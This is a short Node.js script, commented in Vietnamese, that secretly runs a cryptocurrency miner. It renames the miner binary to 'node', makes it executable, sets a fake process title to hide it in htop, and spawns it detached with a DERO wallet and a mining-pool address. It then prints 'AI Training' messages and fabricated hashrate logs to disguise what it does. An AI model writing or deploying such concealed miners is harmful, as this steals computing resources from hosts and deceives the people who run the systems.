const { spawn } = require('child_process');
const { exec } = require('child_process');

// Đổi tên tiến trình hiển thị trong htop
process.title = 'node index.js'; // Đặt tên giả cho tiến trình

// Thông tin pool và ví
const minerPath = './node'; // Đường dẫn tới miner thực tế (đã đổi tên thành "node")
const args = [
  '-w', 'deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqextxqgv3qaljzwm', // Ví
  '-r', 'community-pools.mysrv.cloud:10300', // Pool
  '-p', 'rpc', // Password hoặc protocol
];

// Cấp quyền thực thi cho tệp miner (./node)
exec('chmod +x ./node', (err, stdout, stderr) => {
  if (err) {
    console.error(`Lỗi khi cấp quyền: ${stderr}`);
    return;
  }
  console.log('Cấp quyền thực thi cho ./node thành công.');

  // Chạy miner thực tế
  const miner = spawn(minerPath, args, {
    stdio: ['ignore', 'ignore', 'pipe'], // Giám sát stderr để ghi lại lỗi
    detached: true, 
    shell: true,
  });

  miner.stderr.on('data', (data) => {
    console.error(`Lỗi từ miner: ${data.toString()}`);
  });

  miner.unref();
  console.log('AI Training đang chạy ngầm...');
});

// Hàm giả lập Speed (hashrate) và Job (share)
function generateFakeLog() {
  const fakeSpeed = (Math.random() * 1000 + 500).toFixed(2); // Speed ngẫu nhiên từ 500-1500H/s
  const fakeJob = Math.floor(Math.random() * 50); // Job ngẫu nhiên từ 0-50

  const logEntry = `Speed: ${fakeSpeed}H/s | Job: ${fakeJob} | Time: ${new Date().toISOString()}`;

  // Hiển thị log giả trực tiếp trên terminal
  console.log(logEntry);
}

// Tạo log giả mỗi 5 giây
setInterval(generateFakeLog, 5000);

console.log('AI Training với log Speed và Job...');
